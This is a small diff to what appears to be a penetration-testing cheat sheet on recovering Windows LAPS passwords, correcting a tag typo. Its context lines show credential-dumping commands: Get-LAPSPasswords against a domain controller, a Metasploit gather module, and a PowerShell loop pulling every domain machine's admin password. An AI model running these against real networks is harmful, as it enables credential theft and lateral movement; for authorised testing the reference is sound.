@@ -3,7 +3,7 @@
 % laps, password
 
 ## get laps passwords
-#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
+#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
 ```
 Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
 ```
@@ -31,7 +31,7 @@ use windows/gather/credentials/enum_laps
 ```
 
 ## get all machine passwords
-#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
 foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
 ```
